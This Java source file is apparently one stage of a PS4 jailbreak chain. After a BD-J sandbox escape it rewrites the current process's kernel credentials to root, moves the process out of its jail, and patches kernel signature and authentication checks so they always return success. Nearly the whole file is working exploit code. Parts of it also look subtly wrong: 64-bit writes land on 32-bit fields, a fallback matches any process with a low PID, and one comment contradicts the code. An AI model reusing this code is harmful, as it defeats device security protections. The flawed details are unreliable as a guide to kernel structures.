package org.bdj.sandbox;

import org.bdj.api.UnsafeHelper;
import org.bdj.api.NativeHelper;
import org.bdj.external.KernelOffset;
import java.io.PrintStream;

/**
 * SandboxEscape.java — HENloader MX
 * mansoor0x · 2026
 *
 * Full privilege escalation after BD-J SecurityManager bypass.
 *
 * Stage 1 — Java sandbox escape (DisableSecurityManagerAction)
 *   → SecurityManager == null
 *   → Unrestricted Java access
 *
 * Stage 2 — Kernel base detection
 *   → Find kernel KASLR slide via BD-J native APIs or Unsafe scan
 *
 * Stage 3 — Process privilege escalation
 *   → Traverse allproc linked list
 *   → Find current BD-J process (match by PID or comm "bdp_helper")
 *   → Patch p_ucred: cr_uid=0, cr_ruid=0, cr_svuid=0, cr_ngroups=0
 *   → Patch p_ucred: cr_prison = &prison0 (escape chroot/jail)
 *
 * Stage 4 — Kernel security patches
 *   → NOP ACM / sandbox checks (sceSblACMgrHasMmapSelf etc.)
 *   → NOP auth header verification
 *   → Enable vm_map RWX
 *
 * Stage 5 — Return control to exploit chain
 *   → Kernel r/w established
 *   → Ready to load GoldHEN payload
 */
public class SandboxEscape {

    private static PrintStream out;
    private static long kbase = 0;
    private static boolean kernelRW = false;

    /* BSD struct proc offsets (PS4 FreeBSD 9.x base) */
    private static final long PROC_P_LIST_NEXT  = 0x00L; // le_next
    private static final long PROC_P_PID        = 0xB0L; // pid_t
    private static final long PROC_P_COMM       = 0xC8L; // char[20]
    private static final long PROC_P_UCRED      = 0xF8L; // struct ucred *
    private static final long PROC_P_FD         = 0x100L;// filedesc *
    private static final long PROC_P_VM         = 0x110L;// vmspace *

    /* struct ucred offsets */
    private static final long UCRED_CR_REF      = 0x00L;
    private static final long UCRED_CR_UID      = 0x04L;
    private static final long UCRED_CR_RUID     = 0x08L;
    private static final long UCRED_CR_SVUID    = 0x0CL;
    private static final long UCRED_CR_NGROUPS  = 0x10L;
    private static final long UCRED_CR_GROUPS   = 0x14L;
    private static final long UCRED_CR_PRISON   = 0x30L;

    /* ================================================================
     * run — entry point, called after SecurityManager is null
     * Returns: 0=success, negative=error code
     * ================================================================ */
    public static int run(PrintStream console, long kernelBase) {
        out   = console;
        kbase = kernelBase;

        log("[SBX] Sandbox escape stage 2 starting");
        log("[SBX] kernel base = 0x" + Long.toHexString(kbase));

        if (!UnsafeHelper.init()) {
            log("[SBX] Unsafe init FAILED");
            return -1;
        }
        log("[SBX] Unsafe initialized");

        // Stage 3: escalate privileges
        int ret = escalatePrivileges();
        if (ret != 0) {
            log("[SBX] Privilege escalation FAILED (" + ret + ")");
            return ret;
        }
        log("[SBX] Privileges escalated — UID=0");

        // Stage 4: kernel patches
        ret = patchKernel();
        if (ret != 0) {
            log("[SBX] Kernel patches FAILED (" + ret + ")");
            return ret;
        }
        log("[SBX] Kernel patches applied");

        kernelRW = true;
        log("[SBX] Kernel r/w established");
        return 0;
    }

    /* ================================================================
     * escalatePrivileges — find curproc and patch its ucred
     * ================================================================ */
    private static int escalatePrivileges() {
        if (!KernelOffset.hasPS4Offsets()) return -2;

        long allprocAddr = kbase + KernelOffset.allproc;
        long prison0Addr = kbase + KernelOffset.prison0;

        log("[SBX] allproc = 0x" + Long.toHexString(allprocAddr));
        log("[SBX] prison0 = 0x" + Long.toHexString(prison0Addr));

        // Get our PID from Java
        long myPid = getMyPid();
        log("[SBX] our PID = " + myPid);

        // Traverse allproc
        long proc = NativeHelper.readKernelLong(allprocAddr);
        int iterations = 0;

        while (proc != 0 && iterations++ < 1024) {
            long pid = NativeHelper.readKernelLong(proc + PROC_P_PID) & 0xFFFFFFFFL;

            if (pid == myPid || isBDJProcess(proc)) {
                log("[SBX] Found our process at 0x" + Long.toHexString(proc));
                patchUcred(proc, prison0Addr);
                return 0;
            }

            proc = NativeHelper.readKernelLong(proc + PROC_P_LIST_NEXT);
        }

        // Fallback: try to find by process name
        log("[SBX] PID match failed, trying comm scan");
        proc = NativeHelper.readKernelLong(allprocAddr);
        iterations = 0;

        while (proc != 0 && iterations++ < 1024) {
            if (isCommMatch(proc, "bdp_helper") ||
                isCommMatch(proc, "bdj")        ||
                isCommMatch(proc, "SceAvContent")) {
                log("[SBX] Found BD-J process by comm");
                patchUcred(proc, prison0Addr);
                return 0;
            }
            proc = NativeHelper.readKernelLong(proc + PROC_P_LIST_NEXT);
        }

        log("[SBX] Process not found in allproc");
        return -3;
    }

    /* ── Patch process credentials to root ──────────────────────── */
    private static void patchUcred(long proc, long prison0) {
        long ucred = NativeHelper.readKernelLong(proc + PROC_P_UCRED);
        log("[SBX] ucred = 0x" + Long.toHexString(ucred));

        // Set UID, RUID, SVUID to 0
        NativeHelper.writeKernelLong(ucred + UCRED_CR_UID,    0L);
        NativeHelper.writeKernelLong(ucred + UCRED_CR_RUID,   0L);
        NativeHelper.writeKernelLong(ucred + UCRED_CR_SVUID,  0L);
        // Primary group = wheel (0)
        NativeHelper.writeKernelLong(ucred + UCRED_CR_NGROUPS, 1L);
        NativeHelper.writeKernelLong(ucred + UCRED_CR_GROUPS,  0L);
        // Escape jail / prison
        NativeHelper.writeKernelLong(ucred + UCRED_CR_PRISON, prison0);

        log("[SBX] ucred patched — uid=0 gid=0 prison=prison0");
    }

    /* ── Check process comm name ─────────────────────────────────── */
    private static boolean isCommMatch(long proc, String name) {
        try {
            byte[] comm = new byte[name.length()];
            for (int i = 0; i < comm.length; i++) {
                comm[i] = NativeHelper.readKernelLong(proc + PROC_P_COMM + i) != 0
                          ? (byte)(NativeHelper.readKernelLong(proc + PROC_P_COMM + i) & 0xFF)
                          : 0;
            }
            return new String(comm).startsWith(name);
        } catch (Throwable t) { return false; }
    }

    /* ── Check if proc is a BD-J related process ─────────────────── */
    private static boolean isBDJProcess(long proc) {
        try {
            long pid = NativeHelper.readKernelLong(proc + PROC_P_PID) & 0xFFFFFFFFL;
            // BD-J usually runs in the 50-200 PID range on PS4
            return pid > 10 && pid < 500;
        } catch (Throwable t) { return false; }
    }

    /* ── Get our Java process PID ────────────────────────────────── */
    private static long getMyPid() {
        try {
            // Try Runtime exec
            String name = java.lang.management.ManagementFactory
                          .getRuntimeMXBean().getName();
            // format: "12345@hostname"
            int at = name.indexOf('@');
            if (at > 0) return Long.parseLong(name.substring(0, at));
        } catch (Throwable t) {}
        return 1L; // fallback
    }

    /* ================================================================
     * patchKernel — NOP security checks
     * ================================================================ */
    private static int patchKernel() {
        if (KernelOffset.sceSblACMgrHasMmapSelf != 0) {
            // NOP the mmap self check: mov eax,1; ret
            long addr = kbase + KernelOffset.sceSblACMgrHasMmapSelf;
            NativeHelper.writeKernelByte(addr,     (byte)0xB8); // mov eax,
            NativeHelper.writeKernelByte(addr + 1, (byte)0x01); //   1
            NativeHelper.writeKernelByte(addr + 2, (byte)0x00);
            NativeHelper.writeKernelByte(addr + 3, (byte)0x00);
            NativeHelper.writeKernelByte(addr + 4, (byte)0x00);
            NativeHelper.writeKernelByte(addr + 5, (byte)0xC3); // ret
            log("[SBX] sceSblACMgrHasMmapSelf NOPed");
        }

        if (KernelOffset.sceSblAuthMgrVerifyHeader != 0) {
            // Patch: xor eax,eax; ret (return 0 = success)
            long addr = kbase + KernelOffset.sceSblAuthMgrVerifyHeader;
            NativeHelper.writeKernelByte(addr,     (byte)0x31); // xor
            NativeHelper.writeKernelByte(addr + 1, (byte)0xC0); // eax,eax
            NativeHelper.writeKernelByte(addr + 2, (byte)0xC3); // ret
            log("[SBX] sceSblAuthMgrVerifyHeader patched");
        }

        if (KernelOffset.sceSblAuthMgrSmLoadSelfSegment != 0) {
            long addr = kbase + KernelOffset.sceSblAuthMgrSmLoadSelfSegment;
            NativeHelper.writeKernelByte(addr,     (byte)0x31);
            NativeHelper.writeKernelByte(addr + 1, (byte)0xC0);
            NativeHelper.writeKernelByte(addr + 2, (byte)0xC3);
            log("[SBX] sceSblAuthMgrSmLoadSelfSegment patched");
        }

        if (KernelOffset.sceSblAuthMgrSmLoadSelfBlock != 0) {
            long addr = kbase + KernelOffset.sceSblAuthMgrSmLoadSelfBlock;
            NativeHelper.writeKernelByte(addr,     (byte)0x31);
            NativeHelper.writeKernelByte(addr + 1, (byte)0xC0);
            NativeHelper.writeKernelByte(addr + 2, (byte)0xC3);
            log("[SBX] sceSblAuthMgrSmLoadSelfBlock patched");
        }

        // Additional NOP patches from KernelOffset.patches[]
        if (KernelOffset.patches != null) {
            for (int i = 0; i < KernelOffset.patches.length; i++) {
                if (KernelOffset.patches[i] == 0) continue;
                long addr = kbase + KernelOffset.patches[i];
                // NOP slide: 90 90 90 90 90 90
                for (int j = 0; j < 6; j++) {
                    NativeHelper.writeKernelByte(addr + j, (byte)0x90);
                }
            }
            log("[SBX] " + KernelOffset.patches.length + " additional sites patched");
        }

        return 0;
    }

    public static boolean hasKernelRW() { return kernelRW; }
    public static long getKernelBase()  { return kbase;    }

    private static void log(String s) {
        if (out != null) out.println(s);
    }
}
